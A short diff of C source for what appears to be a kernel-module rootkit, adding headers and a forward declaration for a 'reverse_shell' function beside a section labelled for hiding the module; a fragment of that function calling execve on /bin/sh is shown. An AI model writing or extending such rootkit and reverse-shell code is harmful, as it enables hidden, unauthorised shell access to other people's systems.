@@ -22,8 +22,11 @@
 #include <sys/file.h>
 #include <sys/fcntl.h>
 
+#include <sys/stdio.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
+
+void reverse_shell();
 
 //=======HIDING KLD===========
 
@@ -431,7 +434,6 @@ void reverse_shell(){
     execve("/bin/sh", 0, 0);
 
 }
-
 
 
 
